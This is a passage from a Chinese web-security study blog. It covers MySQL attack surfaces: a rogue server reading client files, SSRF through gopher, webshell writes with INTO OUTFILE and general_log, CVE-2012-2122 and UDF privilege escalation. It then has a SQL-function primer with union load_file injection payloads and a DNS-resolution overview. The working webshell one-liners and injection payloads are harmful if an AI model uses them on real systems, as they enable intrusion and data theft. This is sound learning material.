<h2 id="0x01-攻击面——MySQL客户端任意文件读取">0x01 攻击面——MySQL客户端任意文件读取</h2>
<blockquote>
<p>适用范围：全版本 MySQL/MariaDB Client</p>
<p>条件：客户端连接时开启 –enable-local-infile</p>
</blockquote>
<p>一开始做实验的时候有点懵逼，我作为攻击方去连接受害者的MySQL客户端，然后再读取我本地的文件？？？</p>
<p>后来我再网上查看这个攻击面的利用场景，虽然确实用的地方比较少，但是看了<strong>LoRexxar</strong>这篇<a href="https://paper.seebug.org/1112/">文章</a>之后，还是很有收获的。</p>
<blockquote>
<p>这个实验的前提MySQL变量<code>local_infile=1</code></p>
</blockquote>
<p>CTFer对MySQL的load data infile语句应该都是比较熟悉的，一般形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br></pre></td></tr></table></figure>
<p>MySQL Server会读取服务端的<code>/etc/passwd</code>然后将数据按照<code>\n</code>分割插入表中，但是非local加载的语句收到<code>secure_file_priv</code>的限制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br><span class="line">mysql&gt; select @@secure_file_priv;</span><br><span class="line">+--------------------+</span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+--------------------+</span><br><span class="line">| NULL               |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>但是加上一个local关键字：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br><span class="line">Query OK, 4 rows affected, 1 warning (0.02 sec)</span><br><span class="line">Records: 4  Deleted: 0  Skipped: 0  Warnings: 1</span><br></pre></td></tr></table></figure>
<p>是可以成功执行的，相当于是读取客户端的文件发送到服务端。</p>
<p>MySQL认为<strong>服务端可以要求客户端读取有可读权限的任何文件，客户端不应该连接到不可信的服务端</strong>。</p>
<p>那么现在的问题就是如何构造一个恶意的MySQL服务端。</p>
<p>在搞清楚这个问题之前，我们需要研究一下mysql正常执行链接和查询的数据包结构。</p>
<ol>
<li>Sever返回greeting包，包含版本，协议类型，salt值，server功能项</li>
</ol>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109131329.png" alt=""></p>
<ol start="2">
<li>客户端登录请求</li>
</ol>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109134218.png" alt=""></p>
<p>不知道为啥请求包没有显示用户名，可能是MySQL版本的原因。</p>
<ol start="3">
<li>初始化查询</li>
</ol>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109135309.png" alt=""></p>
<p>由于使用了SSL通信，所以这里看不到具体的初始化查询语句。</p>
<ol start="4">
<li>Load file data</li>
</ol>
<p>这次得把MySQL的SSL连接关闭掉，不然看不到执行语句。方法就是在MySQL的配置文件my.conf的[mysqld]添加<code>skip_ssl</code>即可，再在客户端检查一下是否已经关闭SSL：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109140218.png" alt=""></p>
<p>确认关闭后，执行load file data语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;passwd&#39; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br></pre></td></tr></table></figure>
<p>首先是客户端发发送查询</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109140817.png" alt=""></p>
<p>接着服务端返回了需要的路径，功能类似于告诉客户端把这个文件发给我让我看看</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109145329.png" alt="">****</p>
<p>然后客户端直接把内容发送到了服务端</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109145747.png" alt=""></p>
<p>从上面这个流程可以看出，客户端读取文件的路径并不是从客户端指定的，而是从服务端指定再发送客户端。</p>
<p>正常的查询流程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Client: 我要把&#x2F;etc&#x2F;passwd插入表中</span><br><span class="line">Server: 我要你的&#x2F;etc&#x2F;passwd的内容</span><br><span class="line">Client: &#x2F;etc&#x2F;passwd的内容为...</span><br></pre></td></tr></table></figure>
<p>如果是一个恶意的服务端，可以把流程更改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Client: 我要test表中的内容</span><br><span class="line">Server: 我要你的&#x2F;etc&#x2F;passwd的内容</span><br><span class="line">Client: &#x2F;etc&#x2F;passwd的内容为？？？</span><br></pre></td></tr></table></figure>
<p>并且从MySQL的官方文档中指出<strong>服务端可以在任何查询语句后回复文件传输请求</strong>，也就是说上面第三个语句是可以执行的。</p>
<p>所以构造一个恶意服务端的流程就是：1.回复MySQL client一个greeting包；2.等待client端发送一个查询包；3.回复一个file transfer包。</p>
<p>发现这个漏洞的原作者给出了POC，但是LoRexxar文中提到这个POC并没有适配所有的情况，部分mysql客户端会在登陆成功之后发送ping包，如果没有回复就会断开连接，也有部分mysql client端对greeting包有较强的校验。</p>
<p>这里就拿网上更改之后的POC来拿做实验：<a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p>
<ol>
<li>暂停MySQL Server服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service mysqld stop</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>运行恶意MySQL服务器脚本</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python rogue_mysql_server.py</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>客户端访问MySQL服务器</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -h xxx -u root -p</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>查看mysql.log文件</li>
</ol>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109153808.png" alt=""></p>
<p>LoRexxar文章中还接着提到了关于这个漏洞的进一步利用，比如说读取配置文件，Phar反序列化等等。</p>
<p>其中Phar反序列化这个还挺有意思的，首先生成一个phar：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pwned!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a &quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> A();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后用test.php模拟一次查询</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pwned!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">&#x27;&#123;evil_mysql_ip&#125;&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="number">3667</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">&#x27;select 1;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>伪造的evil mysql server中让mysql client去做<code>load file local</code>查询，读取本地的phar文件。</p>
<h2 id="0x02-攻击面——利用SSRF攻击MySQL">0x02 攻击面——利用SSRF攻击MySQL</h2>
<blockquote>
<p>适用范围：全版本 MySQL/MariaDB Server</p>
<p>条件：拥有空密码用户</p>
</blockquote>
<p>之前在总结SSRF漏洞的时候提到过利用SSRF攻击Redis和FastCGI，没写过关于MySQL。</p>
<p>同样的，利用SSRF攻击MySQL也需要了解MySQL的完整交互协议，并且伪造客户端，通过SSRF进行交互连接。</p>
<p>参考文章同样来自于一篇Seebug上的文章：<a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p>
<p>这个利用条件比较苛刻，可以归属于未授权访问，因为非交互模式下登录并操作MySQL只能无需密码认证。</p>
<p>关于MySQL的认证过程和报文格式我就不多叙述，这里直接演示一下过程，以腾讯云主机MySQL80作为实验机，本地登录。</p>
<p>首先需要新建一个MySQL用户，并且密码为空，使用root登录MySQL后执行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &#39; usernopass&#39;@&#39;localhost&#39;;</span><br><span class="line">GRANT USAGE ON *.* TO &#39; usernopass&#39;@&#39;localhost&#39;;</span><br><span class="line">GRANT ALL ON *.* TO &#39; usernopass&#39;@&#39;localhost&#39;;</span><br></pre></td></tr></table></figure>
<p>有两个办法，一种是用gopherus工具直接生成payload。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201110130516.png" alt=""></p>
<p>另外一种是自己抓包生成原始数据流，再转换成gopher协议的格式。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201110130638.png" alt=""></p>
<p>再利用脚本转换一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>(<span class="params">s</span>):</span></span><br><span class="line">	a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(s),<span class="number">2</span>)]</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span> + <span class="string">&quot;%&quot;</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="keyword">import</span> sys</span><br><span class="line">	s=sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">print</span> result(s)</span><br></pre></td></tr></table></figure>
<p>但是这两种办法我都没能复现出来，可能是看不到执行的结果。</p>
<p>接下来，可以使用SSRF攻击MySQL，那么就可以利用MySQL写入webshell，但是要求secure_file_priv不能为空。</p>
<h2 id="0x03攻击面——MySQL服务端文件读写">0x03攻击面——MySQL服务端文件读写</h2>
<p>这个就比较简单了，但是对要求服务端配置可读写目录和正确的用户权限。</p>
<p>读文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE (&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&#39;) AS Result;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database test;</span><br><span class="line">CREATE TABLE test (id TEXT, content TEXT);</span><br><span class="line">load data infile &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&quot; into table test.test FIELDS TERMINATED BY &#39;\n\r&#39; ;</span><br></pre></td></tr></table></figure>
<p>写文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat (id) from test INTO OUTFILE &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaaa&quot;;</span><br></pre></td></tr></table></figure>
<h2 id="0x04提权">0x04提权</h2>
<p>提权就不写那么详细了，主要是参考m00nback的文章：<a href="https://www.m00nback.xyz/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">https://www.m00nback.xyz/2020/03/30/mysql提权总结/</a></p>
<h3 id="CVE-2012-2122">CVE-2012-2122</h3>
<p>该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p>
<p>影响版本：</p>
<ul>
<li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li>
<li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li>
</ul>
<p>MSF有相关利用模块：<code>use auxiliary/scanner/mysql/mysql_authbypass_hashdump</code></p>
<h3 id="写shell">写shell</h3>
<h4 id="outfile写shell">outfile写shell</h4>
<p>跟上面描述的差不多，关键还是<code>secure_file_priv</code>这个参数，而且是只读参数，必须更改MySQL的配置文件再重启MySQL服务。</p>
<p>来个🌰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; into outfile &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&quot;;</span><br></pre></td></tr></table></figure>
<h4 id="日志写shell">日志写shell</h4>
<p>前提是知道MySQL root用户密码，第一步开启日志记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;;</span><br></pre></td></tr></table></figure>
<p>日志文件导出到指定目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log_file&#x3D;&quot;&#x2F;tmp&#x2F;shell.php&quot;;</span><br></pre></td></tr></table></figure>
<p>记录SQL语句写shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&quot;;</span><br></pre></td></tr></table></figure>
<p>关闭记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;off&#39;;</span><br></pre></td></tr></table></figure>
<h3 id="UDF提权">UDF提权</h3>
<p>大马提权：<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">https://github.com/echohun/tools/blob/master/大马/udf.php</a></p>
<p>手工提权：<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
<p><a href="https://cooltige.com/2020/06/02/Mysql-Udf%E6%8F%90%E6%9D%83/">https://cooltige.com/2020/06/02/Mysql-Udf提权/</a></p>
<p><a href="https://xz.aliyun.com/t/2199">https://xz.aliyun.com/t/2199</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>Web安全学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之数据库系统功能相关学习</title>
    <url>/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Web安全学习之数据库系统功能相关学习">Web安全学习之数据库系统功能相关学习</h1>
<h2 id="任务目标">任务目标</h2>
<ol>
<li>学习数据库自带函数的功能和用法（思考在什么情况下可以使用）；</li>
<li>将所有涉及的函数进行测试并举例说明其用法；</li>
<li>扩展学习：针对不同数据库构造所需环境，尝试执行系统命令。</li>
</ol>
<h2 id="0x01-MySQL常用函数">0x01 MySQL常用函数</h2>
<p>在进行sql注入过程中，会使用到mysql中的内置函数。在内置函数中，又分为获取信息的函数和功能函数。<br>
信息函数是用来获取mysql中的数据库的信息，功能函数就是传统的函数用来完成某项操作。</p>
<ol>
<li>
<p>常用的信息函数</p>
<ul>
<li>
<p><code>database()</code>：用于获取当前使用的数据库信息</p>
<p><img src="https://i.loli.net/2019/09/01/kHTNF6UoWxnZBim.png" alt=""></p>
</li>
<li>
<p><code>version()</code>：返回数据库的版本</p>
<p><img src="https://i.loli.net/2019/09/01/nuBY8U1WcEGFKDa.png" alt=""></p>
</li>
<li>
<p><code>user()</code>：返回当前的用户（等价于current_user参数）</p>
<p><img src="https://i.loli.net/2019/09/01/N3Y1HSFA4PjyXih.png" alt=""></p>
</li>
<li>
<p><code>@@datadir</code>：获取数据库的存储位置</p>
<p><img src="https://i.loli.net/2019/09/01/nbvtak6T7yXpr5J.png" alt=""></p>
</li>
</ul>
</li>
<li>
<p>常见的功能函数</p>
<ul>
<li>
<p><code>load_file()</code>：从计算机中载入文件，读取文件中的数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from table union select 1, load_file(&#39;&#x2F;etc&#x2F;passwd&#39;), 3</span><br><span class="line">select * from table union select 1, load_file(0x2F6574632F706173737764), 3 #使用十六进制绕过单引号限制</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>into_outfile()</code>：写入文件，前提是具有写入条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;&#x2F;tmp&#x2F;xxx.php&#39;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>concat()</code>：返回两个参数相连接产生的字符串。如果其中一个参数为NULL，则返回值为NULL。</p>
<p><img src="https://i.loli.net/2019/09/02/rACWF9Ppve2ykfn.png" alt=""></p>
</li>
<li>
<p><code>group_concat()</code>：用于合并多条记录中的结果。用法如下：</p>
<p><img src="https://i.loli.net/2019/09/02/OFPjlCwrDfgo2aE.png" alt=""></p>
<p>返回的就是users表中所有的用户名，并且是作为一条记录返回。</p>
</li>
<li>
<p><code>substr()</code>：用于截断字符串。用法为：<code>substr(str, pos, length)</code>，注意<code>pos</code>是从1开始的。</p>
<p><img src="https://i.loli.net/2019/09/02/PCRvu4mXKnriNTZ.png" alt=""></p>
</li>
<li>
<p><code>ascii()</code>：返回字符所对应的ascii码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ascii(&#39;a&#39;);          #返回97</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>length()</code>：返回字符串的长度。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select length(&#39;123456&#39;)     #返回6</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>if(exp1, exp2, exp3)</code>：如果exp1是True，则返回exp2；否则返回exp3。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,2,if(1&#x3D;1,3,-1) #1,2,3</span><br><span class="line">select 1,2,if(1&#x3D;2,3,-1) #1,2,-1</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>ifnull(exp1, exp2)</code>：如果exp1是True，则返回exp1；否则返回exp2。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ifnull(sleep(2), 2);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>nullif(exp1, exp2)</code>：如果exp1==exp2，则返回Null；否则返回exp2。</p>
</li>
</ul>
<p>以上就是在进行sql注入工程中常用的函数。当然还存在一些使用的不是很多的函数。</p>
</li>
</ol>
<h2 id="0x02-Linux-MySQL-UDF提权">0x02 Linux MySQL UDF提权</h2>
<h3 id="Step1-获取UDF文件">Step1 获取UDF文件</h3>
<ol>
<li>
<p>查看MySQL版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select version();</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/04/Eqbomf7AdWHCJ46.png" alt=""></p>
<p>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下</p>
</li>
<li>
<p>查找Plugin目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@plugin_dir;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/04/kbd7FAIYerymlJa.png" alt=""></p>
</li>
<li>
<p>查看系统版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/05/VJ1i2fDFLjlcO8C.png" alt=""></p>
</li>
<li>
<p>在Kali Linux中找到合适的UDF</p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567644797501.png" alt="1567644797501"></p>
<blockquote>
<p>注：新版sqlmap 为了防止文件被误杀，对文件进行异或加密，需要使用<code>/usr/share/sqlmap/extra/cloak/</code>路径下的cloak.py解密脚本对<code>lib_mysqludf_sys.so_</code>进行解码，即<code>python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</code>得到<code>lib_mysqludf_sys.so</code>文件</p>
</blockquote>
</li>
</ol>
<h3 id="Step2-上传UDF文件">Step2 上传UDF文件</h3>
<ol>
<li>
<p>首先确保MySQL允许对任意路径进行读写操作，即<code>secure_file_priv =</code></p>
<p><img src="https://i.loli.net/2019/09/05/X6zFtU5wSbcB4Me.png" alt=""></p>
</li>
<li>
<p>将<code>lib_mysqludf_sys.so</code>传至<code>/tmp/</code>路径下，使用<code>load_file()</code>对其读取，并转换成十六进制文件后再写入<code>/tmp/</code>目录下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select hex(load_file(&#39;&#x2F;tmp&#x2F;lib_mysqludf_sys.so&#39;)) into dumpfile &#39;&#x2F;tmp&#x2F;udf.hex&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/05/U8WL4isHGR135SZ.png" alt=""></p>
</li>
<li>
<p>读取<code>udf.hex</code>文件的内容，并上传至<code>/usr/bin/mysql/plugin/</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 0x[udf.hex内容] into dumpfile &#39;&#x2F;usr&#x2F;bin&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Step3-执行命令">Step3 执行命令</h3>
<ol>
<li>
<p>安装UDF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string sonme &#39;udf.so&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/05/UNbKlLsftYQFX1h.png" alt=""></p>
</li>
<li>
<p>执行系统命令</p>
<p><img src="https://i.loli.net/2019/09/05/yxeQCoJdXN8kMlT.png" alt=""></p>
</li>
</ol>
<h2 id="0x03-踩过的坑">0x03 踩过的坑</h2>
<ol>
<li>
<p>在设置 <code>secure_file_privilege=''</code> 且目录权限为 <code>777</code> 后<code>load_file()</code> 无法读取文件。</p>
<ul>
<li><a href="https://bingslient.github.io/2019/08/16/MySQL%20%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E8%A1%A8%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%BD%BF%E7%94%A8-load-file-%E5%87%BD%E6%95%B0">检查Apparmor配置</a></li>
<li>检查文件的用户组是否是属于mysql</li>
</ul>
</li>
<li>
<p>无法上传<code>udf.so</code>至<code>/usr/bin/mysql/plugin/</code>目录。</p>
<ul>
<li>检查该目录的其他组用户受否有读写权限</li>
<li>检查文件的用户组是否是属于mysql</li>
</ul>
</li>
<li>
<p>上传<code>udf.so</code>至指定目录后，<code>create function</code>失败。</p>
<ul>
<li>UDF使用的版本和本机环境不匹配</li>
<li>没有对sqlmap中的UDF文件进行解码操作</li>
</ul>
</li>
<li>
<p>使用<code>select sys_eval();</code>执行命令返回<code>NULL</code>。</p>
<p><a href="https://www.cyberciti.biz/faq/ubuntu-linux-howto-disable-apparmor-commands/">取消Apparmor对mysqld service的限制</a></p>
<p>简单来说就是执行下面两个命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/<span class="built_in">disable</span>/</span><br><span class="line">sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>MySQL</tag>
        <tag>UDF提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之Web页面解析的流程学习</title>
    <url>/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Web安全学习之Web页面解析的流程学习">Web安全学习之Web页面解析的流程学习</h1>
<h2 id="任务目标">任务目标</h2>
<ol>
<li>理解域名解析的整个流程；</li>
<li>理解Web页面请求的整个流程，绘制流程图（ngnix处理的11个过程）；</li>
<li>学习HTTP协议中的字段及含义；</li>
<li>学习HTTP请求方法以及返回状态码的类型和含义。</li>
</ol>
<a id="more"></a>
<h2 id="0x01-域名解析流程">0x01 域名解析流程</h2>
<p><a href="https://jocent.me/2017/06/18/dns-protocol-principle.html#_label2">这篇文章</a>对于DNS讲的还比较透彻，在此基础做一点摘要。</p>
<h3 id="域名层次结构">域名层次结构</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200330233913.png" alt="">)</p>
<h3 id="域名服务器">域名服务器</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200330233929.png" alt="">)<br>
另外还有一个本地域名服务器：当一个主机发出DNS查询请求的时候，这个查询请求首先就是发给本地域名服务器的。</p>
<h3 id="域名解析记录">域名解析记录</h3>
<ul>
<li>A (Address) 记录：又称IP指向，用户可以在此设置⼦域名并指向到⾃⼰的⽬标主机地址上，从<br>
而实现通过域名找到服务器。</li>
<li>CNAME记录：也被称为规范名字。这种记录允许您将多个名字映射到同⼀台计算机。</li>
<li>MX（Mail Exchanger）记录：邮件交换记录，它指向⼀个邮件服务器，⽤于电⼦邮件系统发邮<br>
件时根据 收信⼈的地址后缀来定位邮件服务器。</li>
<li>NS(Name Server)记录：解析服务器记录。⽤来表明由哪台服务器对该域名进⾏解析。这⾥的NS<br>
记录只对⼦域名⽣效。</li>
<li>TXT记录：⼀般指为某个主机名或域名设置的说明。</li>
</ul>
<h3 id="域名解析过程">域名解析过程</h3>
<p>以查询<code>jocent.me</code>为例，其中10.74.36.90为主机IP，10.74.1.11为本地DNS服务器：<br>
①主机10.74.36.90先向本地域名服务器10.74.1.11进行递归查询<br>
②本地域名服务器采用迭代查询，向一个根域名服务器进行查询<br>
③根域名服务器告诉本地域名服务器，下一次应该查询的顶级域名服务器<code>dns.me</code>的IP地址<br>
④本地域名服务器向顶级域名服务器<code>dns.me</code>进行查询<br>
⑤顶级域名服务器me告诉本地域名服务器，下一步查询权限服务器<code>dns.jocent.me</code>的IP地址<br>
⑥本地域名服务器向权限服务器<code>dns.jocent.me</code>进行查询<br>
⑦权限服务器<code>dns.jocent.me</code>告诉本地域名服务器所查询的主机的IP地址<br>
⑧本地域名服务器最后把查询结果告诉 10.74.36.90</p>
<p>总的来说DNS解析过程如下图所示：</p>
<p><img src="https://i.loli.net/2019/10/02/s2INm7z6lAatQgq.png" alt=""></p>
<p>其中有两个概念递归查询和迭代查询:<br>
<strong>递归查询</strong>：本机向本地域名服务器发出一次查询请求，就静待最终的结果。如果本地域名服务器无法解析，自己会以DNS客户机的身份向其它域名服务器查询，直到得到最终的IP地址告诉本机。</p>
<p><img src="https://i.loli.net/2019/10/02/thQ9PuoYVvHN5dr.png" alt=""></p>
<p><strong>迭代查询</strong>：本地域名服务器向根域名服务器查询，根域名服务器告诉它下一步到哪里去查询，然后它再去查，每次它都是以客户机的身份去各个服务器查询。</p>
<p><img src="https://i.loli.net/2019/10/02/drSEsaVmZwnGclj.png" alt=""></p>
<h2 id="0x02-Web页面请求流程">0x02 Web页面请求流程</h2>
